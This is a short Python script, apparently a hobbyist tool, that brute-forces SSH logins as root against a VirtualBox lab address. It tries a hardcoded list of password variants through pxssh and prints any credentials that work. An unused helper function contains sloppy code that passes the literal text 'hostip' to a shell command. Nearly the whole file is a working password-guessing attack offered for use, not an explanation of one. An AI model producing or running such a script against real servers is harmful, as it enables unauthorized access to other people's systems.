#!/usr/bin/env python

__author__ = "Naporium"
__license__ = "USE AT YOUR OWN RISK"
__version__ = 2021

import datetime
from enum import Enum
from subprocess import Popen, PIPE, CalledProcessError
from collections import namedtuple
import logging
import sys
from pexpect import pxssh
# use a custom formatting specification
fmtStr = "%(asctime)s: %(levelname)s: %(funcName)s Line:%(lineno)d User:%(user)s %(message)s"
fmtStr = "%(asctime)s: %(levelname)s: %(message)s"
dateStr = "%m/%d/%Y %I:%M:%S %p"
logging.basicConfig(filename="virtualBoxCommands.log",
                    level=logging.DEBUG,
                    format=fmtStr,
                    datefmt=dateStr)


def brute_force_ssh_service(host_ip, password, username, port=None):
    """
    Brute force server login
    """
    if username is None:
        username = "root"
    os_command_to_run = f'ssh {username}@hostip'
    cmd = os_command_to_run
    # bufsize, if given, has the same meaning as the corresponding argument to the built-in open() function:
    # 0 means unbuffered,
    # 1 means line buffered,
    # any other positive value means use a buffer of (approximately) that size.
    # A negative bufsize means to use the system default, which usually means fully buffered.
    # The default value for bufsize is 0 (unbuffered).
    with Popen(cmd, stdout=PIPE, bufsize=-1, universal_newlines=True, shell=True) as p:
        data = []
        for line in p.stdout:
            data.append(line)

    if p.returncode == 0:
         return False  # machine does exist
    if p.returncode != 0:
        raise RuntimeError(p.returncode, p.args)


def connect(host,user,password):
    try:
        ssh = pxssh.pxssh()
        ssh.force_password = True
        ssh.login(host, user, password)
        print(f"password found  {user}:{password}")
    except pxssh.ExceptionPxssh as e:
        print(e)
    except KeyboardInterrupt as k:
        print("\n")
        print("terminate")
        print("raison:program stop by user",)
        sys.exit(0)


if __name__ == "__main__":
    """
 	Brute SSH
    """
    port = 22
    username = "root"
    hostip = "192.168.56.100"
    password_list = ["Xpto01_", "Xpto01_#", "Xpto", "Xpto01", "Xpto1_", "Xpto1_#"]
    password_list1 = ["xpto01_", "xpto01_#", "xpto", "xpto01", "xpto1_", "xpto1_#"]
    passwd_list = password_list + password_list1

    start_time = datetime.datetime.now()
    print(f"[ OK ] Starting Script at: {start_time}")
    for passwd in passwd_list:
        print(f"[ OK ] Loading password: {passwd}")
        #brute_force_ssh_service(host_ip=hostip, password=passwd, port=port, username=username)
        connect(host=hostip, user=username, password=passwd)
    print(f"[ OK ] Ending Script at: { datetime.datetime.now() - start_time}")

    #brute_force_ssh_service()


